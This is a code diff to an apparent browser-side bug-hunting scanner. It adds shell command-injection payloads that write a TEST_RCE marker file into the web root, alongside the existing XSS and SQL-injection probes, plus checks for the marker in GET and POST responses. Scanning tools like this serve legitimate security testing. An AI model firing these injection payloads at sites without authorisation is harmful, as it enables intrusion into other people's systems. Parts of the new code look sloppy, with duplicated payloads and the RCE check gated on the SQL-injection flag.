@@ -17,7 +17,29 @@ function JsBugHuntingHelper () {
 
   const payloadsXSS = ['<script>alert("XSS_VULNERABLE_PARAM")</script>', '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="']
   const payloadsSQLi = ['"', "'"]
-  const payloadsRCE = ['test" || echo "TEST_RCE" > /var/www/html/testRCE.php#', 'echo "TEST_RCE" > /var/www/html/testRCE.php#', 'test" || echo "TEST_RCE" > /var/www/testRCE.php#', 'echo "TEST_RCE" > /var/www/testRCE.php#']
+  const payloadsRCE = [
+    'test" || echo "TEST_RCE" > /var/www/html/testRCE.php#',
+    'echo "TEST_RCE" > /var/www/html/testRCE.php#',
+    'test" || echo "TEST_RCE" > /var/www/testRCE.php#',
+    'test" || echo "TEST_RCE" > /var/www/testRCE.php#',
+    'test" || echo "TEST_RCE" > /var/www/html/testRCE.php #',
+    'echo "TEST_RCE" > /var/www/html/testRCE.php #',
+    'test" || echo "TEST_RCE" > /var/www/testRCE.php #',
+    'test" || echo "TEST_RCE" > /var/www/testRCE.php  #',
+    'test" || echo "TEST_RCE" > /var/www/html/testRCE.php',
+    'echo "TEST_RCE" > /var/www/html/testRCE.php',
+    'test" || echo "TEST_RCE" > /var/www/testRCE.php',
+    'test" || echo "TEST_RCE" > /var/www/testRCE.php',
+    'test" || echo "TEST_RCE" > /var/www/html/testRCE.php || echo "',
+    'echo "TEST_RCE" > /var/www/html/testRCE.php || echo "',
+    'test" || echo "TEST_RCE" > /var/www/testRCE.php || echo "',
+    'test" || echo "TEST_RCE" > /var/www/testRCE.php || echo "',
+    'test" && echo "TEST_RCE" > /C/var/www/testRCE.php && echo "ciao',
+    '" || echo "TEST_RCE" #',
+    '" && echo "TEST_RCE" #',
+    '" || echo "TEST_RCE"',
+    '" && echo "TEST_RCE"'
+  ]
 
   // eslint-disable-next-line no-multiple-empty-lines
   // eslint-disable-next-line no-unused-vars
@@ -434,7 +456,13 @@ function JsBugHuntingHelper () {
         const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
 
         // eslint-disable-next-line no-undef
-        try { await $.get(newUrl).done(function (data) { }) } catch (reason) { console.log(reason) }
+        try {
+          await $.get(newUrl).done(function (data) {
+            if (data.indexOf('TEST_RCE') !== -1) {
+              result.push({ paramName: v[0], type: 'RCE via Url', url: newUrl })
+            }
+          })
+        } catch (reason) { console.log(reason) }
         // eslint-disable-next-line no-undef
         try {
           await $.get(document.location.origin + '/testRCE.php').done(function (data) {
@@ -521,7 +549,7 @@ function JsBugHuntingHelper () {
     // eslint-disable-next-line no-undef
     const url = $(form).attr('action')
     // eslint-disable-next-line no-undef
-    if ($(form).attr('method') === 'POST' || $(form).attr('method') === 'post') {
+    if ($(form).attr('method') === 'POST' || $(form).attr('method') === 'post' || $(form).attr('method') === '$_POST' || $(form).attr('method') === '$_post') {
       // eslint-disable-next-line no-undef
       try {
         await $.post(url, params).done(function (data) {
@@ -534,6 +562,13 @@ function JsBugHuntingHelper () {
             if (data.indexOf('Uncaught mysql') !== -1) {
               result = { paramName: modifiedParam, type: 'SQL Injection via POST Form' }
               // console.log('Parametro POST "' + modifiedParam + '" Vulnerabile ad SQL Injection')
+            }
+          } else if (vulnType === 'RCE') {
+            if (sqlInjectionScanEnabled === true) {
+              if (data.indexOf('TEST_RCE') !== -1) {
+                result = { paramName: modifiedParam, type: 'RCE via POST Form' }
+              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
+              }
             }
           }
         })
@@ -549,7 +584,7 @@ function JsBugHuntingHelper () {
           } catch (reason) { console.log(reason) }
         }
       } catch (reason) { console.log(reason) }
-    } else if ($(form).attr('method') === 'GET' || $(form).attr('method') === 'get') {
+    } else if ($(form).attr('method') === 'GET' || $(form).attr('method') === 'get' || $(form).attr('method') === '$_GET' || $(form).attr('method') === '$_get') {
       try {
         await $.get(url, params).done(function (data) {
           if (vulnType === 'XSS') {
@@ -563,6 +598,13 @@ function JsBugHuntingHelper () {
             if (sqlInjectionScanEnabled === true) {
               if (data.indexOf('Uncaught mysql') !== -1) {
                 result = { paramName: modifiedParam, type: 'SQL Injection via GET Form' }
+              // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
+              }
+            }
+          } else if (vulnType === 'RCE') {
+            if (sqlInjectionScanEnabled === true) {
+              if (data.indexOf('TEST_RCE') !== -1) {
+                result = { paramName: modifiedParam, type: 'RCE via GET Form' }
               // console.log('Parametro GET "' + modifiedParam + '" Vulnerabile ad SQL Injection')
               }
             }
